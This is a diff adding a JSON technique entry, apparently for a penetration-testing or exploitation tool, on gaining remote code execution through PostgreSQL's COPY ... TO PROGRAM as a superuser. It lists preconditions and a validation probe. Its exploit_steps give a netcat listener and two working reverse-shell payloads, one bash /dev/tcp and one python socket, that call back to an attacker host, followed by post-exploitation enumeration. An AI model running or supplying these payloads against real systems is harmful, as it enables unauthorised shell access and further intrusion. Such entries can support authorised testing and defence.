@@ -1,0 +1,33 @@
+{
+  "product": "postgresql",
+  "associated_ports": ["5432"],
+  "techniques": [
+    {
+      "id": "postgresql-copy-to-program-rce",
+      "title": "PostgreSQL COPY ... TO/FROM PROGRAM → RCE",
+      "severity": "critical",
+      "detection_signals": ["postgresql", "postgres"],
+      "preconditions": [
+        "authenticated database access as a superuser (e.g. the 'postgres' role)",
+        "often reached locally after a foothold (psql -h 127.0.0.1), or with weak/known DB creds"
+      ],
+      "notes": "A superuser can run OS commands via COPY ... TO PROGRAM (write path) or COPY ... FROM PROGRAM (read path). Frequently the pivot from an initial foothold to a second service bound to localhost. Not a CVE — a built-in feature that is dangerous when the connecting role is superuser.",
+      "validate_steps": [
+        "Connect: psql -U postgres -h 127.0.0.1 -p 5432   (use discovered/known creds; often reachable only from localhost after a foothold).",
+        "Confirm command execution is possible (read-only probe): COPY (SELECT '') TO PROGRAM 'id > /tmp/pg_test.txt';  then read /tmp/pg_test.txt.",
+        "A superuser role + successful probe = exploitable."
+      ],
+      "exploit_steps": [
+        "Listener on your box: rlwrap -cAr nc -lvnp {lport}",
+        "In psql: COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"';",
+        "Or (no /dev/tcp): COPY (SELECT '') TO PROGRAM 'python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"{lhost}\\\",{lport}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"';",
+        "Shell returns as the postgres OS user; then enumerate (id, sudo -l) for the next step."
+      ],
+      "cves": [],
+      "refs": [
+        "https://www.postgresql.org/docs/current/sql-copy.html",
+        "https://gtfobins.github.io/gtfobins/psql/"
+      ]
+    }
+  ]
+}
